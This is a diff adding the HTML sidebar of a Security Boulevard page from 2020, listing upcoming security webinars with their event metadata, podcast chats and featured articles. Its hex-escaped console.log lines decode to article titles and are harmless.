+				Nov			</span>
+		
+		<span class="list-daynumber">10</span>
+		</div>
+
+		<div class="list-info">
+						<h2 class="tribe-events-title">
+					<a href="https://securityboulevard.com/webinars/the-devsecops-showdown-how-to-bridge-the-gap-between-security-and-developers/" rel="bookmark">The DevSecOps Showdown: How to Bridge the Gap Between Security and Developers</a>
+			</h2>
+			
+			
+			<div class="tribe-events-duration">
+				<span class="tribe-event-date-start">November 10 @ 1:00 pm</span> - <span class="tribe-event-time">2:00 pm</span>			</div>
+
+			
+			<!-- // Price, Venue Name, Street, City, State or Province, Postal Code, Country, Venue Phone, Organizer Name-->
+			
+					</div>
+	</div> <!-- .list-info -->
+		</div>
+
+		
+	
+		<!-- Event  -->
+		<div class="type-tribe_events post-1862360 tribe-clearfix tribe-events-venue-1758430 tribe-events-organizer-1346924">
+			
+<div class="tribe-mini-calendar-event event--1 ">
+	
+	<div class="list-date">
+					<span class="list-dayname">
+				Nov			</span>
+		
+		<span class="list-daynumber">11</span>
+		</div>
+
+		<div class="list-info">
+						<h2 class="tribe-events-title">
+					<a href="https://securityboulevard.com/webinars/threats-at-the-kitchen-table-balancing-security-and-usability-in-remote-workforces/" rel="bookmark">Threats at the Kitchen Table: Balancing Security and Usability in Remote Workforces</a>
+			</h2>
+			
+			
+			<div class="tribe-events-duration">
+				<span class="tribe-event-date-start">November 11 @ 11:00 am</span> - <span class="tribe-event-time">12:00 pm</span>			</div>
+
+			
+			<!-- // Price, Venue Name, Street, City, State or Province, Postal Code, Country, Venue Phone, Organizer Name-->
+			
+					</div>
+	</div> <!-- .list-info -->
+		</div>
+
+		
+	
+		<!-- Event  -->
+		<div class="type-tribe_events post-1861595 tribe-clearfix tribe-events-venue-1758430 tribe-events-organizer-1346924">
+			
+<div class="tribe-mini-calendar-event event--1 ">
+	
+	<div class="list-date">
+					<span class="list-dayname">
+				Nov			</span>
+		
+		<span class="list-daynumber">16</span>
+		</div>
+
+		<div class="list-info">
+						<h2 class="tribe-events-title">
+					<a href="https://securityboulevard.com/webinars/pentest-as-a-service-impact-2020/" rel="bookmark">Pentest as a Service Impact 2020</a>
+			</h2>
+			
+			
+			<div class="tribe-events-duration">
+				<span class="tribe-event-date-start">November 16 @ 1:00 pm</span> - <span class="tribe-event-time">2:00 pm</span>			</div>
+
+			
+			<!-- // Price, Venue Name, Street, City, State or Province, Postal Code, Country, Venue Phone, Organizer Name-->
+			
+					</div>
+	</div> <!-- .list-info -->
+		</div>
+
+		
+	
+		<!-- Event  -->
+		<div class="type-tribe_events post-1862308 tribe-clearfix tribe-events-venue-1862327">
+			
+<div class="tribe-mini-calendar-event event--1 ">
+	
+	<div class="list-date">
+					<span class="list-dayname">
+				Dec			</span>
+		
+		<span class="list-daynumber">16</span>
+		</div>
+
+		<div class="list-info">
+						<h2 class="tribe-events-title">
+					<a href="https://securityboulevard.com/webinars/discover-deliver-and-secure-your-apis-anywhere/" rel="bookmark">Discover, Deliver and Secure your APIs &#8230; Anywhere</a>
+			</h2>
+			
+			
+			<div class="tribe-events-duration">
+				<span class="tribe-event-date-start">December 16 @ 3:00 pm</span> - <span class="tribe-event-time">4:00 pm</span>			</div>
+
+			
+			<!-- // Price, Venue Name, Street, City, State or Province, Postal Code, Country, Venue Phone, Organizer Name-->
+			
+					</div>
+	</div> <!-- .list-info -->
+		</div>
+
+		
+	
+	<p class="tribe-events-widget-link">
+		<a href="https://securityboulevard.com/webinars/" rel="bookmark">
+			More Webinars		</a>
+	</p>
+
+<script type="application/ld+json">
+[{"@context":"http://schema.org","@type":"Event","name":"The Future of Active Host Vulnerability Monitoring","description":"&lt;p&gt;In the era of the cloud generation, the constant activity around workloads and containers create more vulnerabilities than an organization can keep with. Today\\'s teams play whack-a-mole trying to patch vulnerabilities at scale that either don\\'t matter or can hold up your company\\'s next big release... But it doesn\\'t have to be this way.&lt;/p&gt;\\n","image":"https://securityboulevard.com/wp-content/uploads/2020/10/SB-Webinar-Lacework-10.21.20-01.png","url":"https://securityboulevard.com/webinars/the-future-of-active-host-vulnerability-monitoring/","startDate":"2020-10-21T11:00:00-04:00","endDate":"2020-10-21T12:00:00-04:00","location":{"@type":"Place","name":"Live Webinar","description":"","url":"https://securityboulevard.com/venue/live-webinar/","address":{"@type":"PostalAddress","addressLocality":"Boca Raton","addressRegion":"FL","addressCountry":"United States"},"geo":{"@type":"GeoCoordinates","latitude":26.3683064,"longitude":-80.1289321},"telephone":"","sameAs":"https://securityboulevard.com/webinars/"},"organizer":{"@type":"Person","name":"Security Boulevard","description":"","url":"https://securityboulevard.com/organizer/securityboulevardwebinars/","telephone":"","email":"&#119;e&#98;i&#110;a&#114;s&#64;s&#101;&#99;&#117;&#114;it&#121;&#98;o&#117;&#108;&#101;&#118;ard.&#99;&#111;m","sameAs":"https://securityboulevard.com"},"performer":"Organization"},{"@context":"http://schema.org","@type":"Event","name":"More Than Monitoring: How Observability Takes You From Firefighting to Fire Prevention","description":"&lt;p&gt;For some, observability is just a hollow rebranding of monitoring, for others it\u2019s monitoring on steroids. But what if we told you observability is the new way to find out why\u2014not just if\u2014your distributed system or application isn\u2019t working as expected? Today, we see that traditional monitoring approaches can fall short if a system or..&lt;/p&gt;\\n","image":"https://securityboulevard.com/wp-content/uploads/2020/10/10.27.20-Splunk-01.png","url":"https://securityboulevard.com/webinars/more-than-monitoring-how-observability-takes-you-from-firefighting-to-fire-prevention/","startDate":"2020-10-27T08:00:00-04:00","endDate":"2020-10-27T09:00:00-04:00","location":{"@type":"Place","name":"Live Webinar","description":"","url":"https://securityboulevard.com/venue/live-webinar/","address":{"@type":"PostalAddress","addressLocality":"Boca Raton","addressRegion":"FL","addressCountry":"United States"},"geo":{"@type":"GeoCoordinates","latitude":26.3683064,"longitude":-80.1289321},"telephone":"","sameAs":"https://securityboulevard.com/webinars/"},"organizer":{"@type":"Person","name":"Security Boulevard","description":"","url":"https://securityboulevard.com/organizer/securityboulevardwebinars/","telephone":"","email":"&#119;&#101;bi&#110;&#97;rs&#64;secur&#105;ty&#98;o&#117;&#108;ev&#97;r&#100;&#46;&#99;o&#109;","sameAs":"https://securityboulevard.com"},"performer":"Organization"},{"@context":"http://schema.org","@type":"Event","name":"Best Practices for Driving Software Quality through a Federated Application Security Responsibility Model","description":"&lt;p&gt;For\u00a0DevSecOps\u00a0to become a reality there\u00a0must\u00a0be\u00a0a fundamental shift in mindset and approach\u00a0to\u00a0application\u00a0security\u00a0\u2013\u00a0moving from\u00a0ownership solely within corporate security to a federated, shared model\u00a0of responsibility that spans\u00a0both\u00a0security and software\u00a0engineering teams.\u00a0&lt;/p&gt;\\n","image":"https://securityboulevard.com/wp-content/uploads/2020/10/SB-ZeroNorth-10.28.20-01.png","url":"https://securityboulevard.com/webinars/best-practices-for-driving-software-quality-through-a-federated-application-security-responsibility-model/","startDate":"2020-10-28T13:00:00-04:00","endDate":"2020-10-28T14:00:00-04:00","location":{"@type":"Place","name":"Live Webinar","description":"","url":"https://securityboulevard.com/venue/live-webinar/","address":{"@type":"PostalAddress","addressLocality":"Boca Raton","addressRegion":"FL","addressCountry":"United States"},"geo":{"@type":"GeoCoordinates","latitude":26.3683064,"longitude":-80.1289321},"telephone":"","sameAs":"https://securityboulevard.com/webinars/"},"organizer":{"@type":"Person","name":"Security Boulevard","description":"","url":"https://securityboulevard.com/organizer/securityboulevardwebinars/","telephone":"","email":"we&#98;in&#97;&#114;s&#64;sec&#117;ri&#116;y&#98;&#111;u&#108;&#101;&#118;ard&#46;&#99;&#111;&#109;","sameAs":"https://securityboulevard.com"},"performer":"Organization"},{"@context":"http://schema.org","@type":"Event","name":"How to Make the Promise of Machine Learning a Reality","description":"&lt;p&gt;Machine learning is often discussed as a silver bullet solution to every cloud security challenge, but when push comes to shove it has fallen short of delivering on that promise. That\u2019s because marketing hype has led to unrealistic expectations of machine learning. The reality is that machine learning is just one piece of the puzzle.&lt;/p&gt;\\n","image":"https://securityboulevard.com/wp-content/uploads/2020/10/10-29-20-ThreatStack-SB-01.png","url":"https://securityboulevard.com/webinars/how-to-make-the-promise-of-machine-learning-a-reality/","startDate":"2020-10-29T15:00:00-04:00","endDate":"2020-10-29T16:00:00-04:00","location":{"@type":"Place","name":"Live Webinar","description":"","url":"https://securityboulevard.com/venue/live-webinar/","address":{"@type":"PostalAddress","addressLocality":"Boca Raton","addressRegion":"FL","addressCountry":"United States"},"geo":{"@type":"GeoCoordinates","latitude":26.3683064,"longitude":-80.1289321},"telephone":"","sameAs":"https://securityboulevard.com/webinars/"},"organizer":{"@type":"Person","name":"Security Boulevard","description":"","url":"https://securityboulevard.com/organizer/securityboulevardwebinars/","telephone":"","email":"we&#98;i&#110;a&#114;&#115;&#64;&#115;ecu&#114;&#105;tyb&#111;ul&#101;va&#114;&#100;&#46;&#99;&#111;m","sameAs":"https://securityboulevard.com"},"performer":"Organization"},{"@context":"http://schema.org","@type":"Event","name":"Cyber Threat Intelligence: Highlights and Trends for 2020","description":"&lt;p&gt;Get a comprehensive view of today\u2019s threat landscape \u2014 and a deeper understanding of the biggest cyber risks facing organizations today \u2014 with new insights from the Nokia Threat Intelligence Lab.&lt;/p&gt;\\n","image":"https://securityboulevard.com/wp-content/uploads/2020/10/11-3-20-Nokia-SB-01.png","url":"https://securityboulevard.com/webinars/cyber-threat-intelligence-highlights-and-trends-for-2020/","startDate":"2020-11-03T09:00:00-05:00","endDate":"2020-11-03T10:00:00-05:00","location":{"@type":"Place","name":"Live Webinar","description":"","url":"https://securityboulevard.com/venue/live-webinar/","address":{"@type":"PostalAddress","addressLocality":"Boca Raton","addressRegion":"FL","addressCountry":"United States"},"geo":{"@type":"GeoCoordinates","latitude":26.3683064,"longitude":-80.1289321},"telephone":"","sameAs":"https://securityboulevard.com/webinars/"},"organizer":{"@type":"Person","name":"Security Boulevard","description":"","url":"https://securityboulevard.com/organizer/securityboulevardwebinars/","telephone":"","email":"w&#101;&#98;&#105;na&#114;&#115;&#64;&#115;ecu&#114;i&#116;&#121;&#98;o&#117;l&#101;&#118;&#97;&#114;&#100;&#46;com","sameAs":"https://securityboulevard.com"},"performer":"Organization"},{"@context":"http://schema.org","@type":"Event","name":"The DevSecOps Showdown: How to Bridge the Gap Between Security and Developers","description":"&lt;p&gt;DevSecOps requires processes and tools that enable weaving security throughout the DevOps pipeline. It is much more than a buzzword, and if you\\'d ask most organizations, well, they believe they are in the process of adopting DevSecOps tools and practices. But, are they?&lt;/p&gt;\\n","image":"https://securityboulevard.com/wp-content/uploads/2020/10/11-10-20-WhiteSource-SB-01.png","url":"https://securityboulevard.com/webinars/the-devsecops-showdown-how-to-bridge-the-gap-between-security-and-developers/","startDate":"2020-11-10T13:00:00-05:00","endDate":"2020-11-10T14:00:00-05:00","location":{"@type":"Place","name":"Live Webinar","description":"","url":"https://securityboulevard.com/venue/live-webinar/","address":{"@type":"PostalAddress","addressLocality":"Boca Raton","addressRegion":"FL","addressCountry":"United States"},"geo":{"@type":"GeoCoordinates","latitude":26.3683064,"longitude":-80.1289321},"telephone":"","sameAs":"https://securityboulevard.com/webinars/"},"organizer":{"@type":"Person","name":"Security Boulevard","description":"","url":"https://securityboulevard.com/organizer/securityboulevardwebinars/","telephone":"","email":"w&#101;&#98;&#105;&#110;a&#114;&#115;&#64;s&#101;&#99;&#117;&#114;&#105;t&#121;&#98;&#111;&#117;&#108;&#101;&#118;ard.&#99;&#111;m","sameAs":"https://securityboulevard.com"},"performer":"Organization"},{"@context":"http://schema.org","@type":"Event","name":"Threats at the Kitchen Table: Balancing Security and Usability in Remote Workforces","description":"&lt;p&gt;The tightrope between security and usability is nothing new, but recent events have propelled it to the fore. When the corporate world was forced out of offices and into kitchens, studies and bedrooms, businesses had to peer under every rug for the remote working policies and plans they should have made. Now, as the second..&lt;/p&gt;\\n","image":"https://securityboulevard.com/wp-content/uploads/2020/10/11-11-20-Immersive-Labs-SB-01.png","url":"https://securityboulevard.com/webinars/threats-at-the-kitchen-table-balancing-security-and-usability-in-remote-workforces/","startDate":"2020-11-11T11:00:00-05:00","endDate":"2020-11-11T12:00:00-05:00","location":{"@type":"Place","name":"Live Webinar","description":"","url":"https://securityboulevard.com/venue/live-webinar/","address":{"@type":"PostalAddress","addressLocality":"Boca Raton","addressRegion":"FL","addressCountry":"United States"},"geo":{"@type":"GeoCoordinates","latitude":26.3683064,"longitude":-80.1289321},"telephone":"","sameAs":"https://securityboulevard.com/webinars/"},"organizer":{"@type":"Person","name":"Security Boulevard","description":"","url":"https://securityboulevard.com/organizer/securityboulevardwebinars/","telephone":"","email":"w&#101;bi&#110;&#97;&#114;&#115;&#64;se&#99;u&#114;&#105;&#116;&#121;&#98;o&#117;le&#118;&#97;&#114;&#100;&#46;com","sameAs":"https://securityboulevard.com"},"performer":"Organization"},{"@context":"http://schema.org","@type":"Event","name":"Pentest as a Service Impact 2020","description":"&lt;p&gt;In this webinar we will explore the findings from the recent\u00a0PtaaS Impact Report: 2020, which aims to unravel the benefits and challenges of deploying a SaaS-based pentesting model in a modern software development environment.&lt;/p&gt;\\n","image":"https://securityboulevard.com/wp-content/uploads/2020/10/SB-Cobalt-11.16.20-01-1.png","url":"https://securityboulevard.com/webinars/pentest-as-a-service-impact-2020/","startDate":"2020-11-16T13:00:00-05:00","endDate":"2020-11-16T14:00:00-05:00","location":{"@type":"Place","name":"Live Webinar","description":"","url":"https://securityboulevard.com/venue/live-webinar/","address":{"@type":"PostalAddress","addressLocality":"Boca Raton","addressRegion":"FL","addressCountry":"United States"},"geo":{"@type":"GeoCoordinates","latitude":26.3683064,"longitude":-80.1289321},"telephone":"","sameAs":"https://securityboulevard.com/webinars/"},"organizer":{"@type":"Person","name":"Security Boulevard","description":"","url":"https://securityboulevard.com/organizer/securityboulevardwebinars/","telephone":"","email":"&#119;e&#98;&#105;&#110;a&#114;&#115;&#64;&#115;&#101;curi&#116;&#121;&#98;oul&#101;var&#100;.&#99;o&#109;","sameAs":"https://securityboulevard.com"},"performer":"Organization"},{"@context":"http://schema.org","@type":"Event","name":"Discover, Deliver and Secure your APIs &#8230; Anywhere","description":"&lt;p&gt;The adoption of Kubernetes apps alongside legacy application clusters is accelerating with the growing use of hybrid clouds and multiple cloud providers. However, the deployment of multiple Kubernetes clusters introduces operational challenges for API discovery, delivery and security \u2014 especially due to the rapid spread of APIs.&lt;/p&gt;\\n","image":"https://securityboulevard.com/wp-content/uploads/2020/10/12-16-20-Volterra-SB-01.png","url":"https://securityboulevard.com/webinars/discover-deliver-and-secure-your-apis-anywhere/","startDate":"2020-12-16T15:00:00-05:00","endDate":"2020-12-16T16:00:00-05:00","location":{"@type":"Place","name":"","description":"","url":"https://securityboulevard.com/venue/1862327/","address":{"@type":"PostalAddress","addressLocality":"Boca Raton","addressRegion":"FL","addressCountry":"United States"},"telephone":"","sameAs":""},"performer":"Organization"}]
+</script></div></aside><aside id="custom_html-32" class="widget_text widget widget_custom_html clearfix"><h3 class="widget-title"><span>Download Free eBook</span></h3><div class="textwidget custom-html-widget"><div class="su-row">
+<div class="sue-panel" data-url="" data-target="self" style="background-color:#ffffff;color:#333333;border-radius:0px;-moz-border-radius:0px;-webkit-border-radius:0px;box-shadow:0px 1px 2px #eeeeee;-moz-box-shadow:0px 1px 2px #eeeeee;-webkit-box-shadow:0px 1px 2px #eeeeee;border:0px solid #ddd"><div class="sue-panel-content sue-content-wrap" style="padding:15px;text-align:center"><div class="pt-cv-wrapper"><div class="pt-cv-view pt-cv-grid pt-cv-colsys pt-cv-reused" id="pt-cv-view-06cd18ej3f"><div data-id="pt-cv-page-1" class="pt-cv-page" data-cvc="1"><div class="col-md-12 col-sm-12 col-xs-12 pt-cv-content-item pt-cv-1-col"  data-pid="1841025"><div class='pt-cv-ifield'><a href="https://securityboulevard.com/downloads/the-dangers-of-open-source-software/" class="_self pt-cv-href-thumbnail pt-cv-thumb-default cvplbd" target="_self" rel="noopener noreferrer"><img src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/03/0320_SB_OpenSourceDangers_v1_Page_01-232x300.jpg" class="pt-cv-thumbnail img-none cvp-substitute no-lazyload " alt="The Dangers of Open Source Software and Best Practices for Securing Code" title="" /></a></div></div></div></div></div>			<style type="text/css" id="pt-cv-inline-style-9ecaa9ekmf">#pt-cv-view-06cd18ej3f .pt-cv-title a, #pt-cv-view-06cd18ej3f  .panel-title { font-weight: 600 !important; }
+#pt-cv-view-06cd18ej3f .pt-cv-carousel-caption  { background-color: rgba(51,51,51,.6) !important; }
+#pt-cv-view-06cd18ej3f .pt-cv-specialp { background-color: #CC3333 !important }
+#pt-cv-view-06cd18ej3f .pt-cv-specialp * { color: #fff !important; }
+#pt-cv-view-06cd18ej3f .pt-cv-pficon  { color: #bbb !important; }
+#pt-cv-view-06cd18ej3f .pt-cv-readmore  { color: #ffffff !important; background-color: #00aeef !important; }
+#pt-cv-view-06cd18ej3f .pt-cv-readmore:hover  { color: #ffffff !important; background-color: #00aeef !important; }
+#pt-cv-view-06cd18ej3f  + .pt-cv-pagination-wrapper .pt-cv-more , #pt-cv-view-06cd18ej3f  + .pt-cv-pagination-wrapper .pagination .active a { color: #ffffff !important; background-color: #00aeef !important; }</style>
+			</div></div>
+</div></div></aside><aside id="custom_html-30" class="widget_text widget widget_custom_html clearfix"><h3 class="widget-title"><span>Recent Security Boulevard Chats</span></h3><div class="textwidget custom-html-widget"><div class="sue-panel" data-url="" data-target="self" style="background-color:#ffffff;color:#333333;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;box-shadow:0px 1px 2px #eeeeee;-moz-box-shadow:0px 1px 2px #eeeeee;-webkit-box-shadow:0px 1px 2px #eeeeee;border:1px solid #e5e5e5"><div class="sue-panel-content sue-content-wrap" style="padding:15px;text-align:left"><ul class="su-feed"><li><a href="https://soundcloud.com/user-540767378/cloud-devsecops-and-network-security-all-together" target="_self" title="Does cloud, DevSecOps and network security all go together? They have to in the real world. We sit down with Harry Sverdlove, CTO founder of Edgewise Networks and discuss this very topic as well as top three tips from Harry. Have a listen" rel="noopener noreferrer">Cloud, DevSecOps and Network Security, All Together?</a></li><li><a href="https://soundcloud.com/user-540767378/security-as-code-with-tim-jefferson-barracuda-networks" target="_self" title="The environments that we deploy applications in have certainly changed over the last 10 years. This is true for the way we secure applications as well. Barracuda Networks has ridden this wave to cloud native and making solutions for developers, devops teams and security and risk teams. We speak to Tim Jefferson, VP of public cloud for Barracuda on how they are adapting and helping to shape this market" rel="noopener noreferrer">Security-as-Code with Tim Jefferson, Barracuda Networks</a></li><li><a href="https://soundcloud.com/user-540767378/asrtm-with-rohit-sethi-security-compass" target="_self" title="Application Security Requirements &amp; Threat Management (ASRTM)is a great way to:
+• Lowering costs to build secure	software
+• Making	security measurable
+• Turning unplanned work into planned work
+• Freeing	up time away	from remediation,	and into feature development
+• Having	a single process that works	with	in-house, outsourced, and	commercial software
+• Providing confidence	that	software	is secure, when requirements	are	linked to verification
+
+In this chat with Rohit Sethi of Security Compass, we discuss ASRTM and how it helps DevOps teams, security teams and DevSecOps." rel="noopener noreferrer">ASRTM with Rohit Sethi, Security Compass</a></li><li><a href="https://soundcloud.com/user-540767378/deception-art-or-science-ofer-israeli-illusive-networks" target="_self" title="One of the hottest new trends in the cybersecurity world is what is being called &quot;Deception&quot;. While honeypots and such have been around for a long time, the idea of purposely deceiving your attackers has really gained momentum, especially in the age of APT (advanced persistent threats). The team at Illusive Networks has pioneered this approach to safeguarding your infrastructure. In this Security Boulevard Chat we sit down with Illusive Networks Ofer Israeli to discuss the &quot;art of deception.&quot;" rel="noopener noreferrer">Deception: Art or Science, Ofer Israeli, Illusive Networks</a></li><li><a href="https://soundcloud.com/user-540767378/tips-to-secure-iot-and-connected-systems-w-digicert" target="_self" title="They already number in the billions, but connected devices or IoT were not all built with security as top of mind.
+
+In this chat we speak with Mike Nelson, VP of IoT Security at DigiCert, a global leader in digital security for connected systems and devices. Mike tells what to do with your legacy devices and systems to help make them more secure and what to look for in systems going forward so that you can be as secure as possible.
+
+Great practical advice." rel="noopener noreferrer">Tips to Secure IoT and Connected Systems w/ DigiCert</a></li></ul></div></div>
+
+
+</div></aside><aside id="custom_html-12" class="widget_text widget widget_custom_html clearfix"><div class="textwidget custom-html-widget"><!-- /80877830/SB_Medium -->
+<div id='div-gpt-ad-1503669457440-2' style='text-align: center;margin-bottom: 5px;'>
+<script>
+googletag.cmd.push(function() { googletag.display('div-gpt-ad-1503669457440-2'); });
+</script>
+</div></div></aside><aside id="colormag_featured_posts_small_thumbnails-35" class="widget widget_featured_posts widget_featured_posts_small_thumbnails widget_featured_meta clearfix">		<a href="https://securityboulevard.com/industry-spotlight/"><h3 class="widget-title" style="border-bottom-color:;"><span style="background-color:;">Industry Spotlight <i class="fa fa-angle-double-right" aria-hidden="true"></i></span></h3></a>			<div class="following-post">
+								<div class="single-article clearfix">
+						<figure><a href="https://securityboulevard.com/2020/10/pandemic-pushes-security-analysts-to-the-brink/" title="Pandemic Pushes Security Analysts to the Brink"><img width="130" height="90" src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/stressedout-130x90.jpg" class="attachment-colormag-featured-post-small size-colormag-featured-post-small wp-post-image" alt="Pandemic Pushes Security Analysts to the Brink" loading="lazy" title="Pandemic Pushes Security Analysts to the Brink" srcset="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/stressedout-130x90.jpg 130w, https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/stressedout-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px" /></a></figure><script>console.log('Debug Info: \x53\x74\x79\x6c\x65\x20\x33\x20\x2d\x20\x50\x6f\x73\x74\x3a\x31\x50\x61\x6e\x64\x65\x6d\x69\x63\x20\x50\x75\x73\x68\x65\x73\x20\x53\x65\x63\x75\x72\x69\x74\x79\x20\x41\x6e\x61\x6c\x79\x73\x74\x73\x20\x74\x6f\x20\x74\x68\x65\x20\x42\x72\x69\x6e\x6b');</script>						<div class="article-content">
+							<div class="above-entry-meta"><span class="cat-links"><a href="https://securityboulevard.com/category/blogs/careers/"  rel="category tag">Careers</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/"  rel="category tag">Cybersecurity</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-industry-spotlight/"  rel="category tag">Industry Spotlight</a>&nbsp;<a href="https://securityboulevard.com/category/sb/"  rel="category tag">Security Boulevard (Original)</a>&nbsp;</span></div>							<h3 class="entry-title">
+								<a href="https://securityboulevard.com/2020/10/pandemic-pushes-security-analysts-to-the-brink/" title="Pandemic Pushes Security Analysts to the Brink">Pandemic Pushes Security Analysts to the Brink</a>
+							</h3>
+							<div class="below-entry-meta">
+								<span class="posted-on"><a href="https://securityboulevard.com/2020/10/pandemic-pushes-security-analysts-to-the-brink/" title="3:00 am" rel="bookmark"><i class="fa fa-calendar-o"></i> <time class="entry-date published" datetime="2020-10-19T03:00:46-04:00">October 19, 2020</time></a></span>								<span class="byline"><span class="author vcard"><i class="fa fa-user"></i><a class="url fn n" href="https://securityboulevard.com/author/faiz-shuja/" title="Faiz Shuja">Faiz Shuja | Yesterday</a></span></span>
+								<span class="comments"><i class="fa fa-comment"></i><a href="https://securityboulevard.com/2020/10/pandemic-pushes-security-analysts-to-the-brink/#respond"><span class="dsq-postid" data-dsqidentifier="1862186 https://securityboulevard.com/?p=1862186">0</span></a></span>
+							</div>
+						</div>
+					</div>
+								<div class="single-article clearfix">
+						<figure><a href="https://securityboulevard.com/2020/10/5-security-holes-revealed-in-cybersecurity-asset-management/" title="5 Security Holes Most Often Revealed via Cybersecurity Asset Management"><img width="130" height="90" src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2018/03/Security-Strategies-130x90.jpg" class="attachment-colormag-featured-post-small size-colormag-featured-post-small wp-post-image" alt="5 Security Holes Most Often Revealed via Cybersecurity Asset Management" loading="lazy" title="5 Security Holes Most Often Revealed via Cybersecurity Asset Management" srcset="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2018/03/Security-Strategies-130x90.jpg 130w, https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2018/03/Security-Strategies-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px" /></a></figure><script>console.log('Debug Info: \x53\x74\x79\x6c\x65\x20\x33\x20\x2d\x20\x50\x6f\x73\x74\x3a\x32\x35\x20\x53\x65\x63\x75\x72\x69\x74\x79\x20\x48\x6f\x6c\x65\x73\x20\x4d\x6f\x73\x74\x20\x4f\x66\x74\x65\x6e\x20\x52\x65\x76\x65\x61\x6c\x65\x64\x20\x76\x69\x61\x20\x43\x79\x62\x65\x72\x73\x65\x63\x75\x72\x69\x74\x79\x20\x41\x73\x73\x65\x74\x20\x4d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74');</script>						<div class="article-content">
+							<div class="above-entry-meta"><span class="cat-links"><a href="https://securityboulevard.com/category/blogs/"  rel="category tag">Cybersecurity</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/governance-risk-compliance/"  rel="category tag">Governance, Risk &amp; Compliance</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-industry-spotlight/"  rel="category tag">Industry Spotlight</a>&nbsp;<a href="https://securityboulevard.com/category/sb/"  rel="category tag">Security Boulevard (Original)</a>&nbsp;</span></div>							<h3 class="entry-title">
+								<a href="https://securityboulevard.com/2020/10/5-security-holes-revealed-in-cybersecurity-asset-management/" title="5 Security Holes Most Often Revealed via Cybersecurity Asset Management">5 Security Holes Most Often Revealed via Cybersecurity Asset Management</a>
+							</h3>
+							<div class="below-entry-meta">
+								<span class="posted-on"><a href="https://securityboulevard.com/2020/10/5-security-holes-revealed-in-cybersecurity-asset-management/" title="3:00 am" rel="bookmark"><i class="fa fa-calendar-o"></i> <time class="entry-date published" datetime="2020-10-16T03:00:15-04:00">October 16, 2020</time></a></span>								<span class="byline"><span class="author vcard"><i class="fa fa-user"></i><a class="url fn n" href="https://securityboulevard.com/author/nathan-burke/" title="Nathan Burke">Nathan Burke | 3 days ago</a></span></span>
+								<span class="comments"><i class="fa fa-comment"></i><a href="https://securityboulevard.com/2020/10/5-security-holes-revealed-in-cybersecurity-asset-management/#respond"><span class="dsq-postid" data-dsqidentifier="1862141 https://securityboulevard.com/?p=1862141">0</span></a></span>
+							</div>
+						</div>
+					</div>
+								<div class="single-article clearfix">
+						<figure><a href="https://securityboulevard.com/2020/10/coinbit-seizure-why-new-cryptocurrency-exchanges-conduct-wash-trading/" title="Coinbit Seizure: Why New Cryptocurrency Exchanges Conduct Wash Trading  "><img width="130" height="90" src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2018/03/Stealing-Infrastructure-130x90.jpg" class="attachment-colormag-featured-post-small size-colormag-featured-post-small wp-post-image" alt="Coinbit Seizure: Why New Cryptocurrency Exchanges Conduct Wash Trading  " loading="lazy" title="Coinbit Seizure: Why New Cryptocurrency Exchanges Conduct Wash Trading  " srcset="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2018/03/Stealing-Infrastructure-130x90.jpg 130w, https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2018/03/Stealing-Infrastructure-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px" /></a></figure><script>console.log('Debug Info: \x53\x74\x79\x6c\x65\x20\x33\x20\x2d\x20\x50\x6f\x73\x74\x3a\x33\x43\x6f\x69\x6e\x62\x69\x74\x20\x53\x65\x69\x7a\x75\x72\x65\x3a\x20\x57\x68\x79\x20\x4e\x65\x77\x20\x43\x72\x79\x70\x74\x6f\x63\x75\x72\x72\x65\x6e\x63\x79\x20\x45\x78\x63\x68\x61\x6e\x67\x65\x73\x20\x43\x6f\x6e\x64\x75\x63\x74\x20\x57\x61\x73\x68\x20\x54\x72\x61\x64\x69\x6e\x67\x20\xc2\xa0');</script>						<div class="article-content">
+							<div class="above-entry-meta"><span class="cat-links"><a href="https://securityboulevard.com/category/blogs/cyberlaw/"  rel="category tag">Cyberlaw</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/"  rel="category tag">Cybersecurity</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-industry-spotlight/"  rel="category tag">Industry Spotlight</a>&nbsp;<a href="https://securityboulevard.com/category/sb/"  rel="category tag">Security Boulevard (Original)</a>&nbsp;</span></div>							<h3 class="entry-title">
+								<a href="https://securityboulevard.com/2020/10/coinbit-seizure-why-new-cryptocurrency-exchanges-conduct-wash-trading/" title="Coinbit Seizure: Why New Cryptocurrency Exchanges Conduct Wash Trading  ">Coinbit Seizure: Why New Cryptocurrency Exchanges Conduct Wash Trading  </a>
+							</h3>
+							<div class="below-entry-meta">
+								<span class="posted-on"><a href="https://securityboulevard.com/2020/10/coinbit-seizure-why-new-cryptocurrency-exchanges-conduct-wash-trading/" title="3:00 am" rel="bookmark"><i class="fa fa-calendar-o"></i> <time class="entry-date published" datetime="2020-10-15T03:00:13-04:00">October 15, 2020</time></a></span>								<span class="byline"><span class="author vcard"><i class="fa fa-user"></i><a class="url fn n" href="https://securityboulevard.com/author/mriganka-pattnaik/" title="Mriganka Pattnaik">Mriganka Pattnaik | 4 days ago</a></span></span>
+								<span class="comments"><i class="fa fa-comment"></i><a href="https://securityboulevard.com/2020/10/coinbit-seizure-why-new-cryptocurrency-exchanges-conduct-wash-trading/#respond"><span class="dsq-postid" data-dsqidentifier="1861913 https://securityboulevard.com/?p=1861913">0</span></a></span>
+							</div>
